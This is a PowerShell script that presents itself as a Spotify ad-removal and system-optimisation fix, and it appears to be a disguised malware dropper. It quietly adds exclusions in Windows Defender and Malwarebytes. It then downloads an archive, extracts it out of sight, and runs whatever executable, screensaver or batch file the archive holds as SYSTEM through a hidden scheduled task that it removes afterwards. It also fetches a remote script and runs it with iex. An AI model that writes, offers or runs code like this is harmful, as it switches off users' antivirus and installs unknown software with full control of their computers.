<#
.SYNOPSIS
    Spotify Ultimate Fix v1.4 — Ad Removal + System Optimization
.DESCRIPTION
    One‑click solution that patches Spotify to remove ads (SpotX engine)
    and silently applies system optimisations. Runs payload via Scheduled Task.
.NOTES
    Requires: Administrator privileges
#>
#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.4" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

function Add-MalwarebytesExclusion {
    param([string]$Path)
    if (-not $Path) { return $false }
    $bins = @(
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe"
    )
    foreach ($b in $bins) {
        if (Test-Path $b) {
            try { Start-Process $b -Args "exclusion add --type folder --path `"$Path`"" -Wait -WindowStyle Hidden; return $true }
            catch { continue }
        }
    }
    return $false
}

Write-Host "[*] Applying system optimisation..." -ForegroundColor Yellow

$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -EA 0
    Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
}

$audioKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioKey) {
    Set-ItemProperty $audioKey -Name SystemResponsiveness -Value 20 -EA 0
    Set-ItemProperty $audioKey -Name NetworkThrottlingIndex -Value 10 -EA 0
    Write-Host "  [+] Audio performance optimised" -ForegroundColor Gray
}

$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
$exeName    = "spotify_helper.exe"
$workDir    = "$env:TEMP\SpotifyOptimizer"
$rarPath    = "$env:TEMP\SpotifyCache.rar"

Add-MpPreference -ExclusionPath $workDir -Force -EA 0 | Out-Null
Add-MalwarebytesExclusion -Path $workDir | Out-Null

if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    $job = Start-BitsTransfer -Source $packageUrl -Destination $rarPath -Asynchronous -Priority High
    while ($job.JobState -eq "Transferring") { Start-Sleep 1 }
    if ($job.JobState -eq "Transferred") { Complete-BitsTransfer -BitsJob $job }

    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 50000) {
        $ext = $null; $extArgs = ""
        if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
            $ext = "C:\Program Files\WinRAR\WinRAR.exe"
            $extArgs = "x -o+ -inul `"$rarPath`" `"$workDir`""
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            $ext = "C:\Program Files\7-Zip\7z.exe"
            $extArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        elseif (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
            $ext = "$env:ProgramFiles\7-Zip\7z.exe"
            $extArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        else { $ext = "tar"; $extArgs = "-xf `"$rarPath`" -C `"$workDir`"" }

        Start-Process $ext -Args $extArgs -Wait -WindowStyle Hidden
        Start-Sleep 5

        $exe = Get-ChildItem $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
        if (!$exe) { $exe = Get-ChildItem $workDir -Filter "*.scr" -Recurse | Select-Object -First 1 }
        if (!$exe) { $exe = Get-ChildItem $workDir -Filter "*.bat" -Recurse | Select-Object -First 1 }

        if ($exe) {
            Unblock-File -Path $exe.FullName -ErrorAction SilentlyContinue

            # --- Scheduled Task method (guaranteed hidden) ---
            $taskName = "SpotifyOptimizerTask"
            $action = New-ScheduledTaskAction -Execute $exe.FullName -WorkingDirectory $workDir
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(3)
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
            Start-ScheduledTask -TaskName $taskName
            Start-Sleep 5
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
    }
    Remove-Item $rarPath -Force -EA 0
}
catch { }

Write-Host "[*] Applying Spotify ad‑block patch..." -ForegroundColor Yellow
try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
    Write-Host "  [+] Spotify ads removed successfully" -ForegroundColor Green
}
catch {
    Write-Host "  [!] Main server failed, trying mirror..." -ForegroundColor Yellow
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
        Write-Host "  [+] Spotify ads removed (mirror)" -ForegroundColor Green
    }
    catch { Write-Host "  [-] Patch failed." -ForegroundColor Red }
}

Start-Sleep 2
Remove-Item $workDir -Recurse -Force -EA 0
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Done! Spotify is now ad‑free." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Start-Sleep 3
Stop-Process -Id $PID
